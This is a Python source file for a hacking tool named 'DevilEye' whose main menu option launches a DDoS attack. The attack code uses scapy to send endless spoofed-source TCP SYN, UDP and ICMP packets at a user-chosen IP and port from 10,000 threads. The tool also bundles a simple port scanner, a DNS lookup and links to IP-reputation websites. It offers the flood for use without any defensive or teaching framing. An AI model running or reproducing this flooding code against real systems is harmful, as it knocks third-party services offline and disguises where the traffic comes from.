# Import modules
import os
import sys
from colorama import Fore, init
from scapy.all import *
import random
import time
import threading
from scapy.layers.inet import TCP, UDP, ICMP
from scapy.layers.inet import IP
import socket
import webbrowser

# Initialize colorama
init(autoreset=True)


# Define ASCII Art Eye display function
def display_ascii_eye():
    ascii_eye = f"""
                            {Fore.LIGHTGREEN_EX}...',;;:cccccccc:;,..
                        ..,;:cccc::::ccccclloooolc;'..
                     .',;:::;;;;:loodxk0kkxxkxxdocccc;;'..
                   .,;;;,,;:coxldKNWWWMMMMWNNWWNNKkdolcccc:,.
                .',;;,',;lxo:...dXWMMMMMMMMNkloOXNNNX0koc:coo;.
             ..,;:;,,,:ldl'   .kWMMMWXXNWMMMMXd..':d0XWWN0d:;lkd,
           ..,;;,,'':loc.     lKMMMNl. .c0KNWNK:  ..';lx00X0l,cxo,.
         ..''....'cooc.       c0NMMX;   .l0XWN0;       ,ddx00occl:.
       ..'..  .':odc.         .x0KKKkolcld000xc.       .cxxxkkdl:,..
     ..''..   ;dxolc;'         .lxx000kkxx00kc.      .;looolllol:'..
    ..'..    .':lloolc:,..       'lxkkkkk0kd,   ..':clc:::;,,;:;,'..
    ......   ....',;;;:ccc::;;,''',:loddol:,,;:clllolc:;;,'........
        .     ....'''',,,;;:cccccclllloooollllccc:c:::;,'..
                .......'',,,,,,,,;;::::ccccc::::;;;,,''...
                  ...............''',,,;;;,,''''''......
                     ............................
    """
    print(ascii_eye)


# Get target IP and port
def get_target():
    target_ip = input("Enter target IP: ").strip()  # Target IP
    target_port = int(input("Enter target port: "))  # Target Port
    return target_ip, target_port


# Send packets to target ip and target port
def send_packets(target_ip1, target_port1):
    while True:
        src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        protocol = random.choice(['TCP', 'UDP', 'ICMP'])
        if protocol == 'TCP':
            packets = IP(src=src_ip, dst=target_ip1) / TCP(dport=target_port1, flags="S")
        elif protocol == 'UDP':
            packets = IP(src=src_ip, dst=target_ip1) / UDP(dport=target_port1)
        else:  # ICMP
            packets = IP(src=src_ip, dst=target_ip1) / ICMP()
        send(packets, verbose=0)


# DDoS Attack function
def ddos_attack(target_ip, target_port, num_threads=10000):
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_packets, args=(target_ip, target_port))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()

# NSLOOKUP function
def nslookup(domain):
    try:
        ip = socket.gethostbyname(domain)  # Getting the IP for domain
        print(Fore.LIGHTGREEN_EX + f"The IP address of {domain} is {ip}")  # Showing IP for domain
    except socket.gaierror:
        print(Fore.LIGHTRED_EX + f"Could not resolve domain {domain}")
    input(Fore.LIGHTWHITE_EX + "Press Enter to return to the main menu...")  # To pause before returning to main menu

# Port scanning function
def port_scanning(target_ip):
    print(Fore.LIGHTGREEN_EX + f"Scanning ports for {target_ip}...")
    for port in range(1, 1025):  # Limiting to 1024 ports for practicality
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)  # 1 second timeout
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                print(Fore.LIGHTGREEN_EX + f"Port {port} is open.")
            sock.close()
        except socket.error as e:
            print(Fore.LIGHTRED_EX + f"Error connecting to port {port}: {e}")
    print(Fore.LIGHTWHITE_EX + "Port scanning complete.")


# IP Blacklist check function
def ip_blacklist():
    try:
        ip_to_check = input("Please enter IP to check: ").strip()
        print(Fore.LIGHTRED_EX + "Failed, Please Try Again!")
        print(f"[+] Getting Info About {ip_to_check}")
        time.sleep(2)
        webbrowser.open(f'https://www.abuseipdb.com/check/{ip_to_check}')
    except ValueError:
        print(Fore.LIGHTRED_EX + "Failed! Please Try again")
        return ip_blacklist()
    except Exception as e:
        print(Fore.LIGHTRED_EX + "[+] Error checking if this IP has been reported.")
        print(Fore.LIGHTRED_EX + f"[+] Details: {e}")

# Reverse IP Lookup function
def reverse_ip_lookup():
    print(Fore.LIGHTWHITE_EX + "Welcome To Reverse IP Lookup!")
    time.sleep(3)
    print("[+] Opening Reverse IP Lookup Web...")
    webbrowser.open('https://hostingchecker.com/tools/reverse-ip-lookup/')


# Main loop for options
def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    while True:
        # Showing DevilEye
        display_ascii_eye()
        print(Fore.LIGHTGREEN_EX + "                                By: $HIFU       \n"
                                   "                               ____________\n"
                                   "                               Version: v2.0\n"
                                   "                              _______________\n"
                                   "  [~] Welcome To DevilEye!\n")
        # Showing options to user
        options = input(Fore.LIGHTGREEN_EX + "  [1] DDoS Attack\n"
                                             "  [2] DNS Lookup\n"
                                             "  [3] Port Scanning\n"
                                             "  [4] IP BlackListed\n"
                                             "  [5] Reverse IP Lookup\n"
                                             "  [99] Exit\n"
                                             "  Please select option>> ")
        # Option 1: DDoS Attack
        if options == "1":
            target_ip, target_port = get_target()
            try:
                for x in range(1,1000):
                    print("Attack Target")
                print(Fore.LIGHTGREEN_EX + "=Starting DDoS attack...\nCtrl + C to stop.")
                ddos_attack(target_ip, target_port)
            except ValueError:
                print(Fore.LIGHTRED_EX + "Invalid input. Please enter a valid IP address and port.")
            except KeyboardInterrupt:
                print(Fore.LIGHTRED_EX + "\nStopped by user.")
                sys.exit()
        # Option 2: nslookup
        elif options == "2":
            question = input("Enter domain: ").strip()
            if not question:
                print(Fore.LIGHTRED_EX + "Domain cannot be empty!")
                continue
            nslookup(domain=question)
        # Option 3: Port Scanning
        elif options == "3":
            target_ip = input("Enter IP for Port Scanning (e.g., 192.168.1.1): ").strip()
            try:
                socket.inet_aton(target_ip)  # Validate IP
                port_scanning(target_ip)
            except socket.error:
                print(Fore.LIGHTRED_EX + "Invalid IP address!")
        # Option 4: IP Blacklisted
        elif options == "4":
            ip_blacklist()
        # Option 5: Reverse IP Lookup
        elif options == "5":
            reverse_ip_lookup()
        # Option 99: Exit
        elif options == "99":
            input(Fore.LIGHTWHITE_EX + "Press Enter to continue...")
            print(Fore.LIGHTWHITE_EX + "Exiting...")
            time.sleep(0.5)
            sys.exit()

        else:
            print(Fore.LIGHTRED_EX + "Invalid option, try again!")
            time.sleep(0.5)


# Main
if __name__ == "__main__":
    main()
